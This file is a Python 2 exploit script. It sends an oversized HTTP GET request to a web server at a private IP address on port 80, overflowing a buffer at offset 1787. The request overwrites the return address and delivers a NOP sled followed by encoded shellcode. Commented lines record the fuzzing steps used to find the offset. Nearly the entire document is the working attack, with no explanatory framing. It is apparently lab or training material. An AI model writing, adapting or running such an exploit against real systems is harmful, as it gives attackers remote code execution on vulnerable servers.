import socket
rhost = '192.168.9.147'
rport = 80
nops = "\x90" *20
shellcode = ("\xb8\xb5\xcc\x15\x37\xdb\xc2\xd9\x74\x24\xf4\x5b"
"\x33\xc9\xb1\x31\x31\x43\x13\x03\x43\x13\x83\xeb"
"\x49\x2e\xe0\xcb\x59\x2d\x0b\x34\x99\x52\x85\xd1"
"\xa8\x52\xf1\x92\x9a\x62\x71\xf6\x16\x08\xd7\xe3"
"\xad\x7c\xf0\x04\x06\xca\x26\x2a\x97\x67\x1a\x2d"
"\x1b\x7a\x4f\x8d\x22\xb5\x82\xcc\x63\xa8\x6f\x9c"
"\x3c\xa6\xc2\x31\x49\xf2\xde\xba\x01\x12\x67\x5e"
"\xd1\x15\x46\xf1\x6a\x4c\x48\xf3\xbf\xe4\xc1\xeb"
"\xdc\xc1\x98\x80\x16\xbd\x1a\x41\x67\x3e\xb0\xac"
"\x48\xcd\xc8\xe9\x6e\x2e\xbf\x03\x8d\xd3\xb8\xd7"
"\xec\x0f\x4c\xcc\x56\xdb\xf6\x28\x67\x08\x60\xba"
"\x6b\xe5\xe6\xe4\x6f\xf8\x2b\x9f\x8b\x71\xca\x70"
"\x1a\xc1\xe9\x54\x47\x91\x90\xcd\x2d\x74\xac\x0e"
"\x8e\x29\x08\x44\x22\x3d\x21\x07\x28\xc0\xb7\x3d"
"\x1e\xc2\xc7\x3d\x0e\xab\xf6\xb6\xc1\xac\x06\x1d"
"\xa6\x53\xe5\xb4\xd2\xfb\xb0\x5c\x5f\x66\x43\x8b"
"\xa3\x9f\xc0\x3e\x5b\x64\xd8\x4a\x5e\x20\x5e\xa6"
"\x12\x39\x0b\xc8\x81\x3a\x1e\xab\x44\xa9\xc2\x02"
"\xe3\x49\x60\x5b")


buffer = "GET "
#buffer +="\x41" *2000 #initial crash, fuzz offset = 1787
#buffer += "\x41"*1787 + "\x42" *4 # lands us at 42424242
#buffer += "\x41" * 1787 + "\x42" * 4 + "\x43" * (2000-1787-4)
buffer += "\x41" * 1787 + "\xDF\x19\x2D\x77" + nops + shellcode + "\x43" * (2000-1787-4)
buffer +=" HTTP/1.1\r\n\r\n"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[!] Sending payload"
s.connect((rhost,rport))
print "[!] Sent"
s.send(buffer)
s.close
